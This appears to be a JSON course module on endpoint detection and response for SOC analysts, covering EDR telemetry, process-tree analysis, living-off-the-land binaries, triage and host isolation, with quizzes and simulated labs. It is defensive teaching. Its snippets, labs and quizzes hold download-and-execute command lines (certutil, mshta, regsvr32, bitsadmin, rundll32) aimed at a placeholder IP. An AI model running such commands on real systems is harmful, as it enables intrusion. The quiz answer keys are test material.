@@ -1,0 +1,788 @@
+{
+ "code": "SOC-07",
+ "intro": "Endpoint Detection and Response covers how EDR agents collect telemetry and turn it into detections, and how to read the evidence. You will learn to judge process trees and parent-child relationships, recognize living-off-the-land binaries such as certutil and rundll32, work an alert with a consistent triage checklist, and decide when and how to contain a host. Endpoints are where most attacks execute, so these skills let a SOC confirm threats quickly and limit damage.",
+ "lessons": [
+  {
+   "title": "EDR architecture and telemetry",
+   "why": "Most intrusions end on an endpoint. Understanding what EDR collects and how it decides tells you what it can prove and where it is blind.",
+   "sections": [
+    {
+     "h": "Agent, sensors and kernel visibility",
+     "p": [
+      "An EDR product installs a lightweight agent on each endpoint. The agent runs sensors that watch process creation, image and DLL loads, file writes, registry changes, network connections, and sometimes script execution and memory events. On Windows it relies on kernel callbacks such as PsSetCreateProcessNotifyRoutineEx, minifilter drivers for file activity, the Event Tracing for Windows (ETW) providers, and AMSI for script content. On Linux and macOS it uses eBPF, kernel modules or the Endpoint Security framework. Because the sensor runs close to the kernel, it sees activity even when the attacker avoids dropping files."
+     ]
+    },
+    {
+     "h": "Cloud analysis and detection logic",
+     "p": [
+      "The agent forwards telemetry to a cloud or on-premises backend where it is stored, enriched and analyzed at scale. Detections come from several layers: signatures and machine learning models on files, behavioral rules such as an Office application spawning a shell, indicators of attack mapped to MITRE ATT&CK techniques, and threat intelligence matches on hashes, domains and IPs. Local prevention can block or kill a process within milliseconds, while cloud analytics find patterns across the whole fleet. Alerts typically carry severity, the technique, the process tree and the affected host and user."
+     ]
+    },
+    {
+     "h": "EDR compared with antivirus",
+     "p": [
+      "Traditional antivirus mostly inspects files against signatures and heuristics and gives a verdict about a file. EDR records a continuous history of behavior, so you can ask what happened before and after an alert: which parent started it, what it connected to, which files it touched. EDR also gives response actions such as isolating the host, killing a process, collecting a file or opening a remote shell for live response. Modern endpoint platforms combine both, and XDR extends the idea by correlating endpoint with email, identity, cloud and network data."
+     ]
+    },
+    {
+     "h": "Limits and blind spots",
+     "p": [
+      "EDR is not magic. Hosts without an agent, such as unmanaged devices, printers and many IoT devices, are invisible. Attackers may try to tamper with or disable the agent, use kernel-level techniques or abuse legitimate tools to evade rules. Telemetry has retention limits, and some events are sampled or filtered for cost. Agents can be offline, so a quiet console may mean silence rather than safety. Check sensor health, last check-in time and coverage regularly, and pair EDR with network and identity logs to catch what any one source misses."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "EDR event record (example)",
+    "text": "time: 2026-03-02T09:41:07Z  host: WS-ACCT-07  user: EXAMPLE\\jdoe\nevent: ProcessCreate\nimage: C:\\Windows\\System32\\cmd.exe\nparent: C:\\Program Files\\Example Office\\winword.exe\ncmdline: cmd.exe /c whoami\nsha256: 0f1e...a9 (simulated)  signer: Microsoft Windows"
+   },
+   "example": "A SOC receives a medium-severity EDR alert on host WS-ACCT-07. The console shows more than the single detection: the process creation, the file written to the user's Temp folder two minutes earlier, and an outbound connection to 203.0.113.50. An antivirus alone would have reported only the file verdict. The analyst uses the timeline to reconstruct the sequence and sees the sensor last checked in 30 seconds ago, so the data is current.",
+   "terms": [
+    {
+     "term": "Telemetry",
+     "def": "Recorded data about endpoint activity such as processes, files and connections."
+    },
+    {
+     "term": "Kernel callback",
+     "def": "An operating system hook that notifies a driver of events such as process creation."
+    },
+    {
+     "term": "ETW",
+     "def": "Event Tracing for Windows, a built-in facility that emits detailed system events."
+    },
+    {
+     "term": "AMSI",
+     "def": "The Windows Antimalware Scan Interface that lets security tools inspect script content."
+    },
+    {
+     "term": "XDR",
+     "def": "Extended detection and response that correlates data from many sources."
+    }
+   ],
+   "check": [
+    {
+     "q": "What does EDR record that classic antivirus often does not?",
+     "options": [
+      "Only file signatures",
+      "A continuous history of process and network behavior",
+      "Wi-Fi passwords",
+      "Printer queues"
+     ],
+     "a": 1,
+     "why": "EDR keeps behavioral history for investigation."
+    },
+    {
+     "q": "Which Windows facility lets security tools inspect script content?",
+     "options": [
+      "AMSI",
+      "DHCP",
+      "NTFS",
+      "SMB"
+     ],
+     "a": 0,
+     "why": "AMSI exposes scripts to the scanner at run time."
+    },
+    {
+     "q": "Which is a known EDR blind spot?",
+     "options": [
+      "Managed laptops with agents",
+      "Unmanaged devices with no agent",
+      "Process creation events",
+      "Hashes"
+     ],
+     "a": 1,
+     "why": "Without an agent there is no telemetry."
+    },
+    {
+     "q": "What does a silent console from a host with a stale check-in time most likely mean?",
+     "options": [
+      "The host is clean",
+      "The agent may be offline so absence of alerts is unreliable",
+      "Detections are disabled globally",
+      "Telemetry is encrypted"
+     ],
+     "a": 1,
+     "why": "No data does not prove no activity when the sensor is not reporting."
+    }
+   ],
+   "recap": [
+    "EDR agents collect process, file, registry and network telemetry near the kernel.",
+    "Detection combines signatures, behavior rules, ML and intelligence.",
+    "Check agent coverage and health since silence can mean blindness."
+   ]
+  },
+  {
+   "title": "Process trees and parent-child analysis",
+   "why": "A process tree shows how execution unfolded. Judging parent and child pairs is the quickest way to tell a normal business app from an attack in progress.",
+   "sections": [
+    {
+     "h": "Reading a process tree",
+     "p": [
+      "Every process has a parent, shown by its parent process ID. An EDR draws these relationships as a tree, so you can follow an attack from the first process to the last. Start from the alert and walk up to find the root cause, then down to find what the process spawned. Note the process name, full path, command line, user, integrity level, start time, hash and signer. Context matters: the same powershell.exe can be an administrator's script or malware. Look at the path (System32 versus a user Temp folder) and the command-line arguments."
+     ]
+    },
+    {
+     "h": "Suspicious parent-child pairs",
+     "p": [
+      "Some pairs are rarely legitimate. winword.exe, excel.exe or outlook.exe spawning cmd.exe, powershell.exe, wscript.exe or mshta.exe suggests a malicious macro or exploit. A browser spawning a shell, svchost.exe started by anything other than services.exe, lsass.exe with an unusual parent, and wmiprvse.exe or services.exe launching cmd.exe are worth attention. Expected relationships are equally useful: smss, csrss, wininit and services form the known system chain. A system binary running from the wrong folder, or with a misspelled name such as scvhost.exe, indicates masquerading."
+     ]
+    },
+    {
+     "h": "Command lines, hashes and signers",
+     "p": [
+      "Command lines often reveal intent: encoded commands (powershell -enc followed by base64), hidden window flags (-w hidden), download cradles such as IEX with DownloadString, or arguments that point to a remote URL. A SHA-256 hash lets you check file reputation and prevalence across the fleet; a hash seen on one host only is more suspicious than one seen on thousands. Check the digital signer: Microsoft-signed does not mean safe, because attackers abuse signed tools, but an unsigned binary in a user directory that makes network calls deserves scrutiny. Record each value in your notes."
+     ]
+    },
+    {
+     "h": "Building the story",
+     "p": [
+      "Combine the pieces into a timeline: email attachment opened, Word started, macro spawned PowerShell, PowerShell downloaded a file, the file ran and made a network connection. Each step should be backed by an event. Look for persistence such as scheduled tasks, services or Run keys, and for credential access or lateral movement afterward. Distinguish what is confirmed from what is guessed. If a child process is blocked by EDR, the chain may end early, but you still need to find out whether anything else executed before the block."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Process tree",
+    "text": "explorer.exe (user jdoe)\n  winword.exe  invoice_Q1.docm\n    powershell.exe -w hidden -enc SQBFAFgAIAAoA...\n      rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\a1.dll,Run\n        (net) 203.0.113.50:443"
+   },
+   "example": "The tree above shows Word spawning a hidden, encoded PowerShell, which then launches rundll32 against a DLL in the Temp folder and connects out to 203.0.113.50. Word has no reason to start PowerShell, the -enc and hidden flags hide intent, and a DLL in Temp is unusual. The analyst declares the chain malicious, notes the document name and DLL hash, and moves to containment, then searches the fleet for the same hash.",
+   "terms": [
+    {
+     "term": "Parent process",
+     "def": "The process that created another process."
+    },
+    {
+     "term": "Command line",
+     "def": "The full text used to launch a process, including arguments."
+    },
+    {
+     "term": "Masquerading",
+     "def": "Giving malware the name or look of a legitimate program."
+    },
+    {
+     "term": "Prevalence",
+     "def": "How many hosts in the environment have a given file or hash."
+    },
+    {
+     "term": "Signer",
+     "def": "The publisher named in a file's digital signature."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which parent-child pair is most suspicious?",
+     "options": [
+      "explorer.exe to chrome.exe",
+      "winword.exe to powershell.exe",
+      "services.exe to svchost.exe",
+      "wininit.exe to services.exe"
+     ],
+     "a": 1,
+     "why": "Office applications rarely launch PowerShell legitimately."
+    },
+    {
+     "q": "What does powershell -enc indicate?",
+     "options": [
+      "A GUI option",
+      "An encoded base64 command that hides content",
+      "Encryption of the disk",
+      "Elevated privileges"
+     ],
+     "a": 1,
+     "why": "-EncodedCommand takes a base64 string that obscures the script."
+    },
+    {
+     "q": "A file hash seen on exactly one host in the fleet is",
+     "options": [
+      "More suspicious than a hash seen on thousands",
+      "Always safe",
+      "Always malware",
+      "Irrelevant"
+     ],
+     "a": 0,
+     "why": "Low prevalence suggests a rare or targeted file."
+    },
+    {
+     "q": "Which name suggests masquerading?",
+     "options": [
+      "svchost.exe in System32",
+      "scvhost.exe in a user folder",
+      "explorer.exe in Windows",
+      "cmd.exe in System32"
+     ],
+     "a": 1,
+     "why": "A near-miss name in an odd path imitates a system binary."
+    }
+   ],
+   "recap": [
+    "Walk up from the alert to the root cause, then down to the effects.",
+    "Office-to-shell and similar pairs are strong indicators.",
+    "Use command line, path, hash, signer and prevalence together."
+   ]
+  },
+  {
+   "title": "Living-off-the-land binaries",
+   "why": "Attackers prefer tools already on the system because they are trusted and leave no new files to scan. Recognizing their abuse is a core endpoint skill.",
+   "sections": [
+    {
+     "h": "What LOLBins are",
+     "p": [
+      "Living-off-the-land binaries, scripts and libraries (LOLBins) are legitimate, usually Microsoft-signed, programs that attackers misuse to download, execute, or hide malicious content. Using them avoids dropping obvious malware, may bypass application allowlisting and blends with administration. The community project LOLBAS (Living Off The Land Binaries, Scripts and Libraries) catalogs each binary with its abuse functions and maps them to ATT&CK, for example T1218 System Binary Proxy Execution. Detection rests on unusual arguments, parents, network activity and locations, since the binary itself is not malicious."
+     ]
+    },
+    {
+     "h": "Common examples",
+     "p": [
+      "certutil.exe is a certificate tool abused with -urlcache -split -f to download files and -decode to decode base64 payloads. mshta.exe runs HTML applications and remote scripts. rundll32.exe loads a DLL and calls an exported function, used for proxy execution. regsvr32.exe with /s /u /i:URL scrobj.dll can run remote scriptlets. bitsadmin.exe creates background transfer jobs to download files. wmic.exe can run processes locally and remotely and query systems. Others include msbuild.exe, cscript, installutil and powershell itself."
+     ]
+    },
+    {
+     "h": "Signs of abuse",
+     "p": [
+      "Abuse is visible in command-line details. certutil with a URL, mshta or regsvr32 with an http address, rundll32 with a DLL from Temp, AppData or a Public folder, or with a function such as #1 or an odd name, bitsadmin with /transfer to an unusual host, and wmic with process call create against a remote node. Network connections initiated by binaries that normally do not touch the internet, like regsvr32 or rundll32, are strong evidence. Also notice the parent: a LOLBin spawned by an Office document or a script host raises suspicion further."
+     ]
+    },
+    {
+     "h": "Detection and prevention",
+     "p": [
+      "Build detections around parent-child pairs, rare arguments and outbound connections rather than the binary name. Consider baseline usage: your IT team may use certutil or bitsadmin legitimately, so allowlist those known uses precisely. Prevention options include application control such as WDAC or AppLocker, attack surface reduction rules, constrained PowerShell, removing unused features, and blocking outbound access from servers that do not need it. Log full command lines (Event ID 4688 with command line auditing, and Sysmon Event ID 1) so you have the data to detect and investigate."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Command lines to review",
+    "text": "certutil.exe -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe\nmshta.exe http://203.0.113.50/x.hta\nrundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\a1.dll,Run\nregsvr32 /s /u /i:http://203.0.113.50/s.sct scrobj.dll\nbitsadmin /transfer j /download /priority high http://203.0.113.50/b.exe C:\\Temp\\b.exe"
+   },
+   "example": "An analyst reviews a list of command lines from one host. The certutil line downloads a file from an external IP into the Public folder, which is not what certificate management looks like. The rundll32 line loads a DLL from the user's Temp folder. Both use trusted Microsoft binaries, yet the arguments and locations give them away. The analyst flags the two lines, retrieves the downloaded files for hashing, and checks LOLBAS to confirm the techniques.",
+   "terms": [
+    {
+     "term": "LOLBin",
+     "def": "A legitimate system binary that attackers misuse for malicious purposes."
+    },
+    {
+     "term": "LOLBAS",
+     "def": "A community catalog documenting living-off-the-land binaries and their abuse."
+    },
+    {
+     "term": "Proxy execution",
+     "def": "Running malicious code through a trusted signed binary."
+    },
+    {
+     "term": "Application control",
+     "def": "A policy such as AppLocker or WDAC that limits which programs may run."
+    },
+    {
+     "term": "Sysmon",
+     "def": "A Microsoft tool that logs detailed process, network and file events."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which certutil use is a red flag?",
+     "options": [
+      "-viewstore",
+      "-urlcache -split -f http://203.0.113.50/a.txt",
+      "-store My",
+      "-verify"
+     ],
+     "a": 1,
+     "why": "-urlcache with -f downloads a remote file."
+    },
+    {
+     "q": "Which binary is used for proxy execution of a DLL export?",
+     "options": [
+      "rundll32.exe",
+      "ping.exe",
+      "notepad.exe",
+      "hostname.exe"
+     ],
+     "a": 0,
+     "why": "rundll32 loads a DLL and calls a function."
+    },
+    {
+     "q": "Why is blocking by binary name alone not enough?",
+     "options": [
+      "Binaries are never signed",
+      "The binary has legitimate uses and attackers vary arguments",
+      "Names are random",
+      "EDR cannot see names"
+     ],
+     "a": 1,
+     "why": "The same binary is used by admins, so detection must use arguments, parents and network."
+    },
+    {
+     "q": "Which log source provides full command lines on Windows?",
+     "options": [
+      "Event ID 4688 with auditing, or Sysmon Event ID 1",
+      "DNS cache",
+      "Print spooler",
+      "ARP table"
+     ],
+     "a": 0,
+     "why": "Process creation auditing and Sysmon capture command lines."
+    }
+   ],
+   "recap": [
+    "LOLBins are trusted tools used for download, execution and evasion.",
+    "certutil, mshta, rundll32, regsvr32, bitsadmin and wmic are frequent examples.",
+    "Detect by arguments, parents and network use; control with allowlisting."
+   ]
+  },
+  {
+   "title": "EDR alert triage",
+   "why": "An analyst sees many alerts each shift. A consistent checklist yields fast, defensible verdicts and keeps real threats from being buried.",
+   "sections": [
+    {
+     "h": "Scope and context",
+     "p": [
+      "Begin by understanding what fired: the rule name, the ATT&CK technique, severity and confidence. Identify the host, its role (laptop, server, domain controller) and criticality, and the user, including privilege level. A suspicious alert on a domain controller or an administrator account raises priority. Check whether the activity is still running or was blocked. Read the process tree and command line, and note the time relative to working hours. This quickly answers the basic questions: what happened, where, to whom and is it ongoing."
+     ]
+    },
+    {
+     "h": "History, prevalence and reputation",
+     "p": [
+      "Look at the host's earlier alerts and recent behavior: new software installs, logons from odd places, other detections. Check prevalence: how many other hosts ran this file or command in the last 30 days. Wide prevalence, a trusted signer and a known deployment tool such as a software distribution agent point to a false positive. Check hash and domain reputation in threat intelligence, but treat a clean result as unknown rather than safe, since new malware has no history. Compare with known administrative activity, change tickets or scheduled maintenance windows."
+     ]
+    },
+    {
+     "h": "Reaching a verdict",
+     "p": [
+      "Classify as true positive (malicious), benign true positive (real behavior that is authorized, such as a red-team test or admin script), false positive (detection error) or undetermined needing escalation. Record the evidence for the verdict: the specific events and fields. If you cannot decide, ask the user or their manager a precise question, or escalate to a senior analyst with your notes. Avoid anchoring on the first theory. Search for related activity on other hosts, because one alert is frequently one piece of a larger intrusion."
+     ]
+    },
+    {
+     "h": "Documentation and tuning",
+     "p": [
+      "Write the case note so that another analyst can understand it without the console: summary, evidence, verdict, actions taken and open questions. For recurring false positives, propose a tuning change such as an exclusion limited to a specific path, parent, user group and command line, never a broad disable. Track time to triage and the true positive rate to find noisy rules. Good notes also protect you in later audits and support reporting to management, legal or the incident response team."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Triage checklist",
+    "text": "1. Rule/technique/severity: what fired?\n2. Host role and criticality, user and privileges\n3. Process tree + command line: blocked or running?\n4. Host history: prior alerts, installs, logons\n5. Prevalence, signer, hash/domain reputation\n6. Change ticket or admin explanation?\n7. Verdict + evidence + action + notes"
+   },
+   "example": "An alert fires for powershell with an encoded command on a build server. The analyst sees the parent is the company's deployment agent, the same command ran on 40 build servers in the past week, the signer is the vendor, and a change ticket covers the rollout. The verdict is benign true positive, and the analyst proposes a narrow exclusion for that parent and command line. By contrast, the same command on an accountant's laptop spawned by Word would be escalated.",
+   "terms": [
+    {
+     "term": "True positive",
+     "def": "An alert that correctly identifies malicious activity."
+    },
+    {
+     "term": "False positive",
+     "def": "An alert that fires on benign activity by mistake."
+    },
+    {
+     "term": "Benign true positive",
+     "def": "Genuine detected behavior that is authorized or harmless."
+    },
+    {
+     "term": "Prevalence",
+     "def": "How common a file or behavior is across the environment."
+    },
+    {
+     "term": "Tuning",
+     "def": "Adjusting detection rules to reduce noise without losing coverage."
+    }
+   ],
+   "check": [
+    {
+     "q": "Which factor most raises the priority of an alert?",
+     "options": [
+      "It occurred on a domain controller with an admin account",
+      "It occurred on a test VM",
+      "It is low severity",
+      "It occurred at noon"
+     ],
+     "a": 0,
+     "why": "Critical asset and privileged user increase impact."
+    },
+    {
+     "q": "A clean reputation result for a new hash means",
+     "options": [
+      "It is safe",
+      "It is unknown, not proven safe",
+      "It is malicious",
+      "It is signed"
+     ],
+     "a": 1,
+     "why": "New malware often has no reputation yet."
+    },
+    {
+     "q": "Which tuning change is best for a recurring false positive?",
+     "options": [
+      "Disable the rule",
+      "A narrow exclusion limited to the specific parent, path and user group",
+      "Delete all alerts",
+      "Lower the severity of all rules"
+     ],
+     "a": 1,
+     "why": "Narrow exclusions keep detection coverage."
+    },
+    {
+     "q": "A real but authorized admin script detection is a",
+     "options": [
+      "Benign true positive",
+      "False negative",
+      "Incident",
+      "Zero day"
+     ],
+     "a": 0,
+     "why": "The behavior is real and authorized, so it is benign."
+    }
+   ],
+   "recap": [
+    "Work through scope, user, history, prevalence, reputation and verdict.",
+    "Back every verdict with evidence and clear notes.",
+    "Tune narrowly and hunt for related activity on other hosts."
+   ]
+  },
+  {
+   "title": "Containment and host isolation",
+   "why": "Containment limits damage while you investigate. Acting too slowly lets an attacker spread, while acting too broadly disrupts the business.",
+   "sections": [
+    {
+     "h": "Deciding whether to isolate",
+     "p": [
+      "Isolating a host cuts its network connections except for the EDR management channel, so the attacker loses remote control while you keep access. Isolate when there is confirmed or highly likely malicious activity, evidence of C2 or lateral movement, ransomware behavior, credential theft or when a critical account is involved. Weigh business impact: isolating a production server or a clinician's workstation needs coordination with owners. When severity is high and delay is costly, many playbooks authorize immediate isolation first and consultation after. Document who approved the action and when."
+     ]
+    },
+    {
+     "h": "Containment actions",
+     "p": [
+      "Beyond isolation, common actions are killing a malicious process or process tree, quarantining a file, blocking a hash, domain or IP at EDR, firewall or proxy, disabling or resetting a compromised account and revoking sessions and tokens, and removing malicious persistence such as scheduled tasks. Order matters: preserve volatile evidence where possible by collecting a triage package or memory image before reboot, then contain, then eradicate. Killing a process before collecting its details can lose information, but not stopping active ransomware loses data, so judge by urgency."
+     ]
+    },
+    {
+     "h": "Evidence and chain of custody",
+     "p": [
+      "Keep a record of every response action with times in UTC, the analyst, the reason and the result. Preserve relevant files, logs and memory with hashes, and store them securely so they can be used by forensic teams or legal processes. Avoid logging in to the compromised host with privileged accounts that could expose credentials. Use the EDR live response feature with an account created for that purpose. Do not wipe or reimage a machine until investigation is complete and the incident lead approves."
+     ]
+    },
+    {
+     "h": "Verification and release",
+     "p": [
+      "After isolation, confirm that the host shows as isolated in the console and that known C2 connections stopped. Search the fleet for the same indicators to find other infected hosts. Remediation might mean reimaging, restoring from a known-good backup and resetting passwords for accounts used on that host. Only release the host from isolation after cleaning is verified and monitoring is in place, and note the release in the case. Capture lessons learned, such as the detection gap or missing control, to improve future response."
+     ]
+    }
+   ],
+   "snippet": {
+    "label": "Response log entry",
+    "text": "2026-03-02 09:55Z  WS-ACCT-07  analyst: a.fake\n09:52  Triage package collected (hash 7c1d...e2)\n09:54  Process tree killed: winword.exe > powershell.exe\n09:55  Host isolated (EDR network containment) - confirmed\n09:57  Hash a1.dll blocked; 203.0.113.50 blocked at proxy\n10:05  Account jdoe password reset, sessions revoked"
+   },
+   "example": "A true positive shows a macro launching PowerShell that connects to 203.0.113.50 from WS-ACCT-07. The analyst collects the triage package, kills the process tree, isolates the host and confirms the console shows isolated status. She blocks the hash and IP, resets the user's password and searches the fleet, finding one more host with the same DLL. Each action is logged with a time and reason, and the user is told to leave the laptop connected but untouched.",
+   "terms": [
+    {
+     "term": "Host isolation",
+     "def": "An EDR action that cuts the host's network access except to the management channel."
+    },
+    {
+     "term": "Containment",
+     "def": "Actions that stop an incident from spreading or causing more harm."
+    },
+    {
+     "term": "Eradication",
+     "def": "Removing the attacker's presence such as malware and persistence."
+    },
+    {
+     "term": "Triage package",
+     "def": "A collection of volatile and key artifacts gathered from a host."
+    },
+    {
+     "term": "Live response",
+     "def": "Remote shell and file access through the EDR console."
+    }
+   ],
+   "check": [
+    {
+     "q": "When is host isolation most appropriate?",
+     "options": [
+      "Any low alert",
+      "Confirmed or highly likely malicious activity such as C2 or ransomware",
+      "Never",
+      "Only on Mondays"
+     ],
+     "a": 1,
+     "why": "Isolation stops attacker control when compromise is likely."
+    },
+    {
+     "q": "What should be done before reimaging a compromised host?",
+     "options": [
+      "Nothing",
+      "Preserve evidence and get approval from the incident lead",
+      "Delete logs",
+      "Reset BIOS"
+     ],
+     "a": 1,
+     "why": "Evidence and authorization come before destruction of the system."
+    },
+    {
+     "q": "Which step confirms isolation worked?",
+     "options": [
+      "Assuming it did",
+      "Checking the console status and that C2 connections stopped",
+      "Rebooting",
+      "Sending an email"
+     ],
+     "a": 1,
+     "why": "Verify the host is isolated and malicious traffic ceased."
+    },
+    {
+     "q": "Why log each response action with time and reason?",
+     "options": [
+      "For fun",
+      "For accountability, handoff and later investigation",
+      "It reduces CPU",
+      "It is optional"
+     ],
+     "a": 1,
+     "why": "Records support audits, handoffs and forensic work."
+    }
+   ],
+   "recap": [
+    "Isolate on confirmed malicious activity, weighing business impact.",
+    "Preserve evidence, then contain and eradicate in a sensible order.",
+    "Verify isolation, hunt for other hosts and document every action."
+   ]
+  }
+ ],
+ "labs": [
+  {
+   "title": "Read the process tree",
+   "sim": "log-viewer",
+   "scenario": "An EDR alert fired on laptop WS-ACCT-07 for user EXAMPLE\\jdoe shortly after the user opened an emailed attachment. The log viewer shows the process events in order.",
+   "objective": "Trace the tree from the attachment to the child shell and name the suspicious step.",
+   "steps": [
+    {
+     "do": "Open the alert and view the first event.",
+     "see": "09:40:58 outlook.exe (PID 4120) wrote invoice_Q1.docm to Downloads."
+    },
+    {
+     "do": "Next event.",
+     "see": "09:41:03 explorer.exe started winword.exe invoice_Q1.docm."
+    },
+    {
+     "do": "Next event.",
+     "see": "09:41:07 winword.exe started cmd.exe /c whoami (PID 5532)."
+    },
+    {
+     "do": "Next event.",
+     "see": "09:41:09 cmd.exe started powershell.exe -w hidden -enc SQBFAFgA..."
+    },
+    {
+     "do": "Next event.",
+     "see": "09:41:12 powershell.exe connected to 203.0.113.50:443."
+    }
+   ],
+   "answer": "The suspicious step is winword.exe spawning cmd.exe and then hidden, encoded PowerShell, followed by an outbound connection to 203.0.113.50. A malicious macro in invoice_Q1.docm is the likely root cause.",
+   "hint": "Ask which application should never launch a shell."
+  },
+  {
+   "title": "Spot the LOLBin",
+   "sim": "terminal",
+   "scenario": "The terminal lists five command lines collected from one workstation in the last hour. Two of them abuse trusted binaries.",
+   "objective": "Flag the certutil download and the rundll32 proxy execution.",
+   "steps": [
+    {
+     "do": "Run: show cmdlines.",
+     "see": "1) ping 192.0.2.1  2) certutil -urlcache -split -f http://203.0.113.50/a.txt C:\\Users\\Public\\a.exe  3) ipconfig /all  4) rundll32 C:\\Users\\jdoe\\AppData\\Local\\Temp\\a1.dll,Run  5) whoami"
+    },
+    {
+     "do": "Run: flag 2.",
+     "see": "Line 2 flagged: certutil used to download a file (LOLBAS: Download)."
+    },
+    {
+     "do": "Run: flag 4.",
+     "see": "Line 4 flagged: rundll32 executing a DLL from Temp (LOLBAS: Execute)."
+    },
+    {
+     "do": "Run: flag 1.",
+     "see": "Line 1 is routine network testing. Not suspicious on its own."
+    },
+    {
+     "do": "Run: submit.",
+     "see": "Correct: lines 2 and 4 flagged. Lines 1, 3, 5 are common discovery commands, worth noting but benign alone."
+    }
+   ],
+   "answer": "Line 2 (certutil -urlcache -split -f to an external IP) is a download via LOLBin, and line 4 (rundll32 on a DLL in Temp) is proxy execution of malicious code. Lines 1, 3 and 5 are ordinary commands.",
+   "hint": "Look for URLs and Temp or Public folder paths."
+  },
+  {
+   "title": "Triage an EDR alert",
+   "sim": "siem",
+   "scenario": "An alert shows powershell -enc on server BUILD-12 spawned by the deployment agent. Use the SIEM views to decide whether it is real.",
+   "objective": "Check host history, file prevalence and user context and label the alert.",
+   "steps": [
+    {
+     "do": "Open host history for BUILD-12.",
+     "see": "Last 30 days: 0 prior alerts. Software deployment agent runs weekly."
+    },
+    {
+     "do": "Check command-line prevalence.",
+     "see": "Same command line seen on 39 other build servers in 7 days."
+    },
+    {
+     "do": "Check the user context.",
+     "see": "Account: EXAMPLE\\svc-deploy (service account, expected on build servers)."
+    },
+    {
+     "do": "Check the change calendar.",
+     "see": "Change CHG-1042: agent update rollout, 2026-03-02 window 09:00-11:00 UTC."
+    },
+    {
+     "do": "Select a verdict.",
+     "see": "Options: True positive, False positive, Escalate."
+    },
+    {
+     "do": "Choose False positive (benign).",
+     "see": "Accepted. Suggested tuning: exclude parent deploy-agent.exe with this command hash on BUILD servers only."
+    }
+   ],
+   "answer": "The alert is a false positive (benign authorized activity): the deployment agent ran the same encoded command on 39 other servers under a service account during an approved change window. Add a narrow exclusion, not a broad disable.",
+   "hint": "Prevalence plus a change ticket is strong support."
+  },
+  {
+   "title": "Isolate the host",
+   "sim": "scenario",
+   "scenario": "Confirmed malicious activity was found on WS-ACCT-07: macro, PowerShell and C2 to 203.0.113.50. You must choose containment actions in a sensible order.",
+   "objective": "Choose actions in order, confirm isolation and record them in the case notes.",
+   "steps": [
+    {
+     "do": "Select first action: collect triage package.",
+     "see": "Package collected, hash 7c1d...e2 stored in the case."
+    },
+    {
+     "do": "Select: kill process tree winword > powershell.",
+     "see": "Processes terminated. No new child processes seen."
+    },
+    {
+     "do": "Select: isolate host.",
+     "see": "Isolation command sent. Console status: Isolated (management channel only)."
+    },
+    {
+     "do": "Select: block hash a1.dll and IP 203.0.113.50.",
+     "see": "Hash added to blocklist. IP blocked on proxy."
+    },
+    {
+     "do": "Select: reset account and revoke sessions for jdoe.",
+     "see": "Password reset required and sessions revoked."
+    },
+    {
+     "do": "Open case notes and record actions.",
+     "see": "Notes saved with UTC times and your analyst ID."
+    }
+   ],
+   "answer": "Correct order: collect evidence, kill the malicious processes, isolate the host and confirm status, block indicators, reset the compromised account, then record every action with times in the case notes. Do not reimage before approval.",
+   "hint": "Evidence first, then stop spread, then verify and document."
+  }
+ ],
+ "checkpoint": [
+  {
+   "q": "Which sensor technology gives EDR deep Windows process visibility?",
+   "options": [
+    "Kernel callbacks and ETW",
+    "Printer drivers",
+    "Screen savers",
+    "DHCP leases"
+   ],
+   "a": 0,
+   "why": "Kernel callbacks and ETW supply process and system events."
+  },
+  {
+   "q": "How does EDR differ from classic AV?",
+   "options": [
+    "It only scans files",
+    "It keeps behavioral history and offers response actions",
+    "It has no cloud",
+    "It replaces firewalls"
+   ],
+   "a": 1,
+   "why": "EDR records behavior and allows isolation and live response."
+  },
+  {
+   "q": "Which parent-child pair is a strong malicious indicator?",
+   "options": [
+    "winword.exe to powershell.exe",
+    "services.exe to svchost.exe",
+    "explorer.exe to notepad.exe",
+    "wininit.exe to services.exe"
+   ],
+   "a": 0,
+   "why": "Office launching a shell is typical of macro malware."
+  },
+  {
+   "q": "What does a rare hash seen on one host suggest?",
+   "options": [
+    "It is safe",
+    "Possibly a targeted or new file worth scrutiny",
+    "Nothing",
+    "A Microsoft update"
+   ],
+   "a": 1,
+   "why": "Low prevalence deserves closer inspection."
+  },
+  {
+   "q": "Which command is typical LOLBin download abuse?",
+   "options": [
+    "certutil -urlcache -split -f URL file",
+    "hostname",
+    "dir",
+    "cls"
+   ],
+   "a": 0,
+   "why": "certutil can fetch remote files."
+  },
+  {
+   "q": "What should regsvr32 with an http scriptlet address make you think of?",
+   "options": [
+    "Normal driver install",
+    "Remote scriptlet execution",
+    "Disk repair",
+    "DNS"
+   ],
+   "a": 1,
+   "why": "The /i:URL scrobj.dll pattern runs remote scripts."
+  },
+  {
+   "q": "Which is a benign true positive?",
+   "options": [
+    "Malware blocked",
+    "An authorized admin script that triggered a real detection",
+    "A false alert from a faulty rule",
+    "A zero day"
+   ],
+   "a": 1,
+   "why": "The behavior is real but authorized."
+  },
+  {
+   "q": "What is best for a recurring false positive?",
+   "options": [
+    "Disable the rule",
+    "Narrow exclusion by parent, path and user",
+    "Ignore all alerts",
+    "Delete the host"
+   ],
+   "a": 1,
+   "why": "Narrow scoped tuning keeps coverage."
+  },
+  {
+   "q": "What should come before reimaging a host?",
+   "options": [
+    "Evidence preservation and approval",
+    "Immediate wipe",
+    "Ignoring the alert",
+    "Public announcement"
+   ],
+   "a": 0,
+   "why": "Evidence and sign-off protect the investigation."
+  },
+  {
+   "q": "After isolating a host you should",
+   "options": [
+    "Confirm status, hunt for the same indicators on other hosts and document",
+    "Walk away",
+    "Delete logs",
+    "Power on more hosts"
+   ],
+   "a": 0,
+   "why": "Verification, scoping and documentation complete containment."
+  }
+ ]
+}
